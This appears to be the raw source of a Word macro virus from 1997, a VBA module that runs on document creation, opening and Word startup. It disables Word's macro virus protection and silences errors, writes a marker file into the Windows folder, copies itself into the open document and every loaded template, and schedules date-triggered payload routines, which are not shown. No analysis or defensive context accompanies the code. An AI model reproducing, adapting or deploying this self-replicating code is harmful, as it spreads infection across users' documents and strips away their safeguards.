   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "L_"
   'V1.1
   '4/10/97
   'MJRN-MF-TA
   Const Refresh = "00:50:00"
   Const Boom = "28/3/"
   Sub AutoNew()
           Options.VirusProtection = False
           On Error Resume Next

           Dim f As Integer
           f = FreeFile
           Dim c As Integer
           Open "C:\WINDOWS\MAJORANA.E" For Append Access Read Write As f Len = Len(c)
           c = Rnd * 1000
           Write #f, c
           Close f

           Application.OrganizerCopy _
               Source:=ThisDocument.FullName, _
               Destination:=ActiveDocument.FullName, _
               Name:="L_", _
               Object:=wdOrganizerObjectProjectItems
           For Each d In Templates
           If (ThisDocument.FullName <> d.FullName) Then
               Application.OrganizerDelete _
               Source:=d.FullName, _
               Name:="L_", Object:=wdOrganizerObjectProjectItems
               Application.OrganizerCopy _
                   Source:=ThisDocument.FullName, _
                   Destination:=d.FullName, _
                   Name:="L_", _
                   Object:=wdOrganizerObjectProjectItems
               d.Save
           End If
           Next d
   End Sub
   Sub AutoOpen()
           Options.VirusProtection = False
           On Error Resume Next
           Dim f As Integer
           f = FreeFile
           Dim c As Integer
           Open "C:\WINDOWS\MAJORANA.E" For Append Access Read Write As f Len = Len(c)
           c = Rnd * 1000
           Write #f, c
           Close f

           If (ThisDocument.FullName <> ActiveDocument.FullName) Then
               Application.OrganizerDelete _
                   Source:=ActiveDocument.FullName, _
                   Name:="L_", Object:=wdOrganizerObjectProjectItems
               Application.OrganizerCopy _
                   Source:=ThisDocument.FullName, _
                   Destination:=ActiveDocument.FullName, _
                   Name:="L_", _
                   Object:=wdOrganizerObjectProjectItems
               ActiveDocument.Save
           End If
           For Each d In Templates
           If (ThisDocument.FullName <> d.FullName) Then
               Application.OrganizerDelete _
                   Source:=d.FullName, _
                   Name:="L_", Object:=wdOrganizerObjectProjectItems
               Application.OrganizerCopy _
                   Source:=ThisDocument.FullName, _
                   Destination:=d.FullName, _
                   Name:="L_", _
                   Object:=wdOrganizerObjectProjectItems
               d.Save
           End If
           Next d
   End Sub
   Sub AutoExec()
           Options.VirusProtection = False
           On Error Resume Next

           Dim f As Integer
           f = FreeFile
           Dim c As Integer
           Open "C:\WINDOWS\MAJORANA.E" For Append Access Read Write As f Len = Len(c)
           c = Rnd * 1000
           Write #f, c
           Close f

           Dim v As Date
           v = DateValue(Boom & Year(Now))
           If (Date >= v) And (Date <= v + 2) Then
               Application.OnTime when:=Now + TimeValue(Refresh), Name:="L_.effetto"
           Else
               Application.OnTime when:=Now + TimeValue(Refresh), Name:="L_.effetto2"
           End If
   End Sub
